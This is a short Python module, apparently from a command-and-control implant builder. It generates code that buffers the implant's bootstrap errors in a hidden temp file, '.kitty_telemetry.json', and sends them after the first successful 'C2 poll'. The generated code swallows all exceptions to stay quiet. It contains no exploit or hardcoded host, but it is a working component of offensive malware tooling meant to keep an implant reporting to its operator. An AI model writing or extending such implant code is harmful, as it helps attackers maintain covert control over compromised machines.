#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Local bootstrap telemetry buffer flushed after first successful C2 poll."""

from __future__ import annotations


def build_telemetry_buffer_bootstrap(
    buffer_path: str = "",
    *,
    var_name: str = "_kitty_telemetry",
    path_is_expression: bool = False,
) -> str:
    """Return Python source for offline error buffering and post-connect flush."""
    path_arg = buffer_path if path_is_expression else repr(buffer_path or "")
    default_path = (
        path_arg
        if path_is_expression
        else "repr(_os.path.join(_tmp.gettempdir(), '.kitty_telemetry.json'))"
    )
    if not path_is_expression and not buffer_path:
        path_setup = f"_kitty_telemetry_path = {default_path}"
    elif path_is_expression:
        path_setup = f"_kitty_telemetry_path = {path_arg}"
    else:
        path_setup = f"_kitty_telemetry_path = {path_arg}"

    return f"""
import json as _json
import os as _os
import tempfile as _tmp
import time as _time

{path_setup}
_kitty_telemetry_flushed = False

def _kitty_telemetry_load():
    try:
        if _os.path.isfile(_kitty_telemetry_path):
            with open(_kitty_telemetry_path, "r", encoding="utf-8", errors="replace") as _fh:
                _data = _json.load(_fh)
            if isinstance(_data, dict) and isinstance(_data.get("events"), list):
                return _data
    except Exception:
        pass
    return {{"version": 1, "events": []}}

def _kitty_telemetry_save(_data):
    try:
        _dir = _os.path.dirname(_kitty_telemetry_path)
        if _dir:
            _os.makedirs(_dir, exist_ok=True)
        _tmp_path = _kitty_telemetry_path + ".tmp"
        with open(_tmp_path, "w", encoding="utf-8") as _fh:
            _json.dump(_data, _fh, separators=(",", ":"))
        _os.replace(_tmp_path, _kitty_telemetry_path)
    except Exception:
        pass

def _kitty_telemetry_record(_phase, _event, _detail=""):
    try:
        _data = _kitty_telemetry_load()
        _data.setdefault("events", []).append({{
            "ts": _time.time(),
            "phase": str(_phase or ""),
            "event": str(_event or ""),
            "detail": str(_detail or "")[:4000],
        }})
        if len(_data["events"]) > 200:
            _data["events"] = _data["events"][-200:]
        _kitty_telemetry_save(_data)
    except Exception:
        pass

def _kitty_telemetry_pending():
    try:
        return bool(_kitty_telemetry_load().get("events"))
    except Exception:
        return False

def _kitty_telemetry_flush_after_poll(_post_fn):
    global _kitty_telemetry_flushed
    if _kitty_telemetry_flushed:
        return False
    _data = _kitty_telemetry_load()
    _events = _data.get("events") or []
    if not _events:
        _kitty_telemetry_flushed = True
        return False
    try:
        _body = _json.dumps({{
            "type": "bootstrap_telemetry",
            "events": _events,
        }}).encode("utf-8")
        _post_fn(_body)
        _kitty_telemetry_save({{"version": 1, "events": []}})
        _kitty_telemetry_flushed = True
        return True
    except Exception as _exc:
        _kitty_telemetry_record("telemetry", "flush_failed", str(_exc))
        return False

{var_name} = {{
    "path": _kitty_telemetry_path,
    "record": _kitty_telemetry_record,
    "pending": _kitty_telemetry_pending,
    "flush_after_poll": _kitty_telemetry_flush_after_poll,
}}
""".strip()
